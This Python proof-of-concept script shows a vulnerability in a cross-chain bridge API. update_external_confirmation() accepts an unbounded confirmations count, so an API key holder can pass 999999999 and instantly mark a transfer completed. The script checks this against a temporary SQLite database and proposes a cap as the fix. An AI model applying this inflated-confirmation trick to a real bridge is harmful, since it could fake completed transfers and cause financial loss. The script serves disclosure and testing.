#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
"""
PoC: Bridge update_external confirmations unbounded (C11)

update_external_confirmation() accepts any non-negative integer for
confirmations with no upper bound. An API key holder can set
confirmations=999999999 to instantly mark any transfer "completed".

Fix: Add max_value cap consistent with BRIDGE_DEFAULT_CONFIRMATIONS scale.
"""
import os, sys, sqlite3, tempfile, time, json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from node.bridge_api import update_external_confirmation, BRIDGE_DEFAULT_CONFIRMATIONS

tmpdir = tempfile.mkdtemp()
db_path = os.path.join(tmpdir, "test_c11.db")

conn = sqlite3.connect(db_path)
conn.executescript("""
    CREATE TABLE bridge_transfers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tx_hash TEXT, direction TEXT, source_chain TEXT, dest_chain TEXT,
        source_address TEXT, dest_address TEXT, amount_rtc REAL,
        amount_i64 INTEGER, bridge_type TEXT, memo TEXT,
        external_tx_hash TEXT, external_confirmations INTEGER DEFAULT 0,
        required_confirmations INTEGER DEFAULT 12,
        status TEXT DEFAULT 'locked', lock_epoch INTEGER,
        created_at INTEGER, updated_at INTEGER, expires_at INTEGER,
        completed_at INTEGER, voided_by TEXT, voided_reason TEXT,
        failure_reason TEXT
    );
    CREATE TABLE lock_ledger (
        id INTEGER PRIMARY KEY AUTOINCREMENT, bridge_transfer_id TEXT,
        lock_type TEXT, amount_i64 INTEGER, status TEXT
    );
    INSERT INTO bridge_transfers (id, tx_hash, status, required_confirmations, created_at)
    VALUES (1, 'test_tx_1', 'locked', 12, 1000);
""")
conn.commit()

# Verify: confirmations=999999999 instantly completes
success, result = update_external_confirmation(
    conn, 'test_tx_1', 'ext_tx_abc', 999999999
)
conn.commit()

status = conn.execute("SELECT status, external_confirmations FROM bridge_transfers WHERE tx_hash='test_tx_1'").fetchone()
conn.close()

print(f"Status: {status[0]}, confirmations: {status[1]}")
print(f"BRIDGE_DEFAULT_CONFIRMATIONS={BRIDGE_DEFAULT_CONFIRMATIONS}")
if status[0] == 'completed' and status[1] == 999999999:
    print("🔴 C11: confirmations unbounded — set to 999999999, transfer completed")
else:
    print("✅ Transfer not affected")

import shutil
shutil.rmtree(tmpdir)
